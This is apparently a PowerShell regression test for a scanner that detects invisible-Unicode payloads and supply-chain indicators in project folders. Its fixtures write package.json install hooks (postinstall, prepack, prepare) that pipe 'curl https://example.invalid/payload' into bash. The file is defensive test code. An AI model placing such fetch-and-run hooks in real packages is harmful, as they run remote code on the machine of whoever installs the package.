$ErrorActionPreference = 'Stop'
$ScannerTestRoot = Split-Path -Parent $PSScriptRoot
$source = [IO.File]::ReadAllText((Join-Path $ScannerTestRoot 'Start-InvisiblePayloadScanner.ps1'))
$end = $source.IndexOf('if ($SelfTest) {')
if ($end -lt 0) { throw 'Test import boundary missing.' }
# Import the real functions without starting a server or invoking any fixture code.
. ([scriptblock]::Create($source.Substring(0, $end).Replace('$PSScriptRoot', '$ScannerTestRoot')))
$testRoot = Join-Path $ScannerTestRoot ('_coverage-check-' + [guid]::NewGuid().ToString('N'))
[void][IO.Directory]::CreateDirectory($testRoot)
$script:checksPassed = 0
function Assert-Check($Condition, [string]$Label) {
    if (-not $Condition) { throw ('FAILED: ' + $Label) }
    $script:checksPassed++
}
function New-Case([string]$Name) {
    $path = Join-Path $testRoot $Name
    [void][IO.Directory]::CreateDirectory($path)
    return $path
}
function Write-Fixture($Folder, $Name, $Text) {
    $path = Join-Path $Folder $Name
    [void][IO.Directory]::CreateDirectory((Split-Path -Parent $path))
    [IO.File]::WriteAllText($path, $Text)
}
function Scan-Case($Folder, $Mode = 'full-safety-pre-scan', $Progress = $null) {
    Invoke-Scanner -Options ([pscustomobject]@{ rootPath=$Folder; scanMode=$Mode; filter='*'; excludeDirs='.git'; excludeFiles='*.md'; ruleId='glassworm_variation_selectors'; minRun=3; maxFileSizeMb=1 }) -Progress $Progress
}
function Assert-Counts($Result) {
    $c = $Result.coverage.counts
    Assert-Check ($c.candidateFiles -eq $c.completedFiles + $c.failedFiles + $c.notAttemptedFiles) 'file count equation'
    foreach ($check in $Result.coverage.checks.Values) {
        Assert-Check ($check.eligibleFiles -eq $check.completedFiles + $check.failedFiles + $check.notAttemptedFiles) 'check count equation'
    }
}
try {
    $normal = New-Case normal
    Write-Fixture $normal 'good.js' 'const answer = 42;'
    Write-Fixture $normal 'image.png' 'unsupported'
    Write-Fixture $normal '.git/hidden.js' 'not visited'
    $r = Scan-Case $normal
    Assert-Check ($r.coverage.status -eq 'complete' -and $r.matchCount -eq 0) 'normal complete with intentional exclusions'
    Assert-Check ($r.coverage.counts.completedFiles -eq 1) 'excluded directory not traversed'
    Assert-Check ($r.responseGuidance.responses.Count -eq 0) 'no unnecessary questions'
    Assert-Counts $r
    $empty = New-Case empty
    Assert-Check ((Scan-Case $empty).coverage.status -eq 'not_assessed') 'empty folder not safe result'
    Write-Fixture $empty 'image.png' 'unsupported'
    Assert-Check ((Scan-Case $empty).coverage.status -eq 'not_assessed') 'all unsupported not assessed'

    $broken = New-Case broken
    Write-Fixture $broken 'package.json' '{broken'
    $r = Scan-Case $broken
    Assert-Check ($r.coverage.status -eq 'partial' -and $r.coverage.checks.invisible.status -eq 'complete' -and $r.coverage.checks.supplyChain.status -eq 'partial') 'both mode preserves successful check'
    Assert-Check ($r.errors[0].message -eq 'parse_failed') 'parse failure has fixed safe code'
    Assert-Counts $r
    Write-Fixture $broken '.vscode/tasks.json' '{broken'
    $r = Scan-Case $broken
    Assert-Check ($r.coverage.counts.failedFiles -eq 2) 'invalid task is not raw fallback'

    $large = New-Case large
    Write-Fixture $large 'large.js' ('a' * (1024*1024 + 1))
    $r = Scan-Case $large
    Assert-Check ($r.coverage.status -eq 'partial' -and $r.coverage.counts.notAttemptedFiles -eq 1) 'size omission visible'
    Assert-Counts $r

    $locked = New-Case locked
    Write-Fixture $locked 'locked.js' 'not read'
    $stream = [IO.File]::Open((Join-Path $locked 'locked.js'), 'Open', 'ReadWrite', 'None')
    try { $r = Scan-Case $locked } finally { $stream.Dispose() }
    Assert-Check ($r.matchCount -eq 0 -and $r.coverage.status -eq 'partial' -and $r.coverage.counts.failedFiles -eq 1) 'zero findings with read failure'
    Assert-Check ($r.riskAssessment.level -eq 'unknown') 'all checks failed is unknown risk'
    Assert-Counts $r

    $badMany = New-Case many
    1..205 | ForEach-Object { Write-Fixture $badMany "p$_/package.json" '{broken' }
    $r = Scan-Case $badMany 'supply-chain-ioc'
    Assert-Check ($r.coverage.issueTotal -eq 205 -and $r.errors.Count -eq 200 -and $r.coverage.issueDetailsTruncated) 'issue total survives detail cap'

    $limit = New-Case limit
    Write-Fixture $limit 'hits.js' (([string][char]0xFE0F * 3 + 'x') * 5001)
    Write-Fixture $limit 'later.js' 'ok'
    $r = Scan-Case $limit
    Assert-Check ($r.results.Count -eq 5000 -and $r.coverage.status -eq 'partial' -and $r.resultLimitReached) 'finding cap is partial'
    Assert-Counts $r
    $originalMax = $MaxCandidateFiles
    try {
        $MaxCandidateFiles = 1
        $threw = $false
        try { [void](Scan-Case $limit) } catch { $threw = $_.Exception.Message -like 'Too many candidate files*' }
        Assert-Check $threw 'candidate cap fails explicitly'
    } finally { $MaxCandidateFiles = $originalMax }

    $advice = New-Case advice
    Write-Fixture $advice 'package.json' '{"scripts":{"postinstall":"curl https://example.invalid/payload | bash","test":"node --version"}}'
    $r = Scan-Case $advice 'supply-chain-ioc'
    Assert-Check ($r.responseGuidance.responses.Count -eq 1) 'one relevant question'
    Assert-Check ($r.responseGuidance.responses[0].strongEvidenceFindingIds.Count -eq 1 -and $r.responseGuidance.responses[0].operation -eq 'postinstall') 'strong advice tied to named command evidence'
    Write-Fixture $advice 'package.json' '{"scripts":{"prepack":"curl https://example.invalid/payload | bash"}}'
    $r = Scan-Case $advice 'supply-chain-ioc'
    Assert-Check ($r.responseGuidance.responses[0].executionContext -eq 'manual_script') 'pack operation not inferred as install'
    Write-Fixture $advice 'package.json' '{"scripts":{"postinstall":"curl https://example.invalid/payload | bash","test":"node --version"}}'
    Write-Fixture $advice 'node_modules/example/package.json' '{"scripts":{"prepare":"curl https://example.invalid/payload | bash"}}'
    $r = Scan-Case $advice 'supply-chain-ioc'
    Assert-Check ($r.responseGuidance.responses.Count -eq 1) 'dependency development script not an urgent question'
    Write-Fixture $advice 'package.json' '{"name":"keyv","version":"6.0.0"}'
    $r = Scan-Case $advice 'supply-chain-ioc'
    Assert-Check ($r.responseGuidance.responses[0].executionContext -eq 'package_or_code' -and $r.responseGuidance.responses[0].strongEvidenceFindingIds.Count -eq 0) 'package presence does not establish execution path'

    $cancelled = $false
    try { [void](Scan-Case $normal 'full-safety-pre-scan' { throw 'ScanCancelled' }) } catch { $cancelled = $_.Exception.Message -eq 'ScanCancelled' }
    Assert-Check $cancelled 'cancel does not fabricate a result'

    $timeoutCase = New-Case timeout
    Write-Fixture $timeoutCase 'slow.txt' (('a' * 10000) + '!')
    $r = Invoke-Scanner -Options ([pscustomobject]@{ rootPath=$timeoutCase; scanMode='invisible-unicode'; filter='*'; ruleId='custom'; customPattern='(a+)+$'; maxFileSizeMb=1 })
    Assert-Check ($r.coverage.status -eq 'partial' -and $r.errors[0].message -eq 'regex_timeout') 'real regex timeout is incomplete'

    $badStructure = New-Case bad-structure
    Write-Fixture $badStructure 'package.json' '{"scripts":42}'
    Write-Fixture $badStructure '.claude/settings.json' '{broken'
    $r = Scan-Case $badStructure
    Assert-Check ($r.coverage.counts.failedFiles -eq 2 -and $r.coverage.status -eq 'partial') 'malformed configuration shapes are incomplete'

    $ruleCopy = New-Case rules
    Copy-Item -LiteralPath (Join-Path $ScannerTestRoot 'rules') -Destination $ruleCopy -Recurse
    $actualRoot = $ScannerTestRoot
    try {
        $ScannerTestRoot = $ruleCopy
        [void](Get-SupplyChainRules)
        $ruleFile = Join-Path $ruleCopy 'rules/v0.4/download-and-execute-rules.json'
        [IO.File]::WriteAllText($ruleFile, '{"schemaVersion":1,"updatedAt":"2026-10-21","downloadAndExecutePatterns":[{"pattern":"["}]}')
        $failed = $false
        try { [void](Get-SupplyChainRules) } catch { $failed = $_.Exception.Message -eq 'rules_invalid' }
        Assert-Check $failed 'invalid regex fails before scan'
        Assert-Check ((Scan-Case $normal 'invisible-unicode').coverage.status -eq 'complete') 'unselected rules do not affect invisible scan'
        Remove-Item -LiteralPath $ruleFile
        $failed = $false
        try { [void](Get-SupplyChainRules) } catch { $failed = $_.Exception.Message -eq 'rules_missing' }
        Assert-Check $failed 'missing rule pack fails before scan'
    } finally { $ScannerTestRoot = $actualRoot }

    $request = @{ headers = @{ host='127.0.0.1:8787'; 'x-scanner-token'='synthetic-test-token'; origin='http://127.0.0.1:8787' } }
    Assert-Check (Test-ApiRequest $request 'synthetic-test-token' @('http://127.0.0.1:8787')) 'valid local API headers'
    $request.headers.Remove('origin')
    Assert-Check (-not (Test-ApiRequest $request 'synthetic-test-token' @('http://127.0.0.1:8787'))) 'missing Origin still rejected'
    'Coverage regression checks passed: ' + $script:checksPassed
}
finally {
    $resolved = [IO.Path]::GetFullPath($testRoot)
    $boundary = [IO.Path]::GetFullPath($ScannerTestRoot).TrimEnd('\') + '\_coverage-check-'
    if (-not $resolved.StartsWith($boundary, [StringComparison]::OrdinalIgnoreCase)) { throw 'Test cleanup boundary mismatch.' }
    [IO.Directory]::Delete($resolved, $true)
}
